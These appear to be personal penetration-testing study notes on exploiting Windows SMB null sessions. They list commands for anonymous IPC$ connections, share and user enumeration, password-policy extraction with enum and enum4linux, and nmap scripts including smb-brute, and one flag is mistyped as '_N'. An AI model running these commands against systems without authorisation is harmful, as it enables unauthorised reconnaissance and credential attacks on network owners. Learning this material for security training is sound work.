#Null Sessions-RCM 8/16/2021
#Can only be used for Windows shares (NetBIOS, SMB ports 137,138,139)
#Logging in without any credentals IPC$
#nbtstat command usage to enumerate windows targets

#Common example command to display info about a target
`nbtstat -A <IP>`
 - Name field=name of the machine
 - <00> record type= machine is a workstation
 - Type "UNIQUE" = computer only has one IP
 - <20> record type= file sharing service is up
  - meaning: gather more info about it
  - enumerate shares with `NET VIEW <target IP>`

#Nmblookup is the Linux utility version of nbtstat
`nmblookup -A <target IP>`
- Use smbclient to enumerate shares provided by the host (like NET VIEW in windows)
`smbclient -L //<target IP> -N`
 - -L = services; -N = force tool to not ask for a password
 - displays admin shares too!! (unlike NET VIEW)
#Exploiting IPC$ admin share (connect without valid creds)
`NET USE \\<target IP address>\IPC$ '' /u:''`
 - Tells Windows to connect to IPC$ share with empty username and password
#Checking for Null Sessions with Linux
`smbclient //10.130.40.80/IPC$ _N`
#Exploiting Null Sessions with Enum
`enum -S <IP>`
 - enumerates admin shares too.
`enum -U <IP>` 
 - enumerates the users
`enum -P <IP>`
 - checks password policy (good to mount network authentication attack)
#Exploiting Null Sessions with Winfo
`winfo <IP> -n`
 - -n tells utility to use null sessions
#Exploiting Null Sessions with Enum4Linux
 - user + share enum, group and member enum, password policy extraction, OS info detection, nmblookup run, printer info extraction
#Null sessions video + usage
`nmap -sS -p 135,139,445 192.168.102.0-255`
`enum4linux -n <targetip>`
Notice: File Server Service is <ACTIVE>
Run -P flag to enumerate password policy on the remote system.
`enum4linux -P <target IP>`
Run -S flag to enumerate the number of shares on the remote machine.
`enum4linux -S <target IP>`
If can't view shares with the above command ^ Use:
`enum4linux -s /usr/share/enum4linux/share-list.txt <target ip>`
Compiling all these commands...:
`enum4linux -a <target ip>`
Alternatively..NMAP FOR LYFE
`nmap -script=smb-enum-shares <target IP>`
Note: if vulnerable to NULL Sessions. `IPC$ Anonymous access: READ`
`nmap -script=smb-enum-users <target IP>`
Note: Users + password info
`nmap -script=smb-brute <target IP>`
Note: Valid user credentials
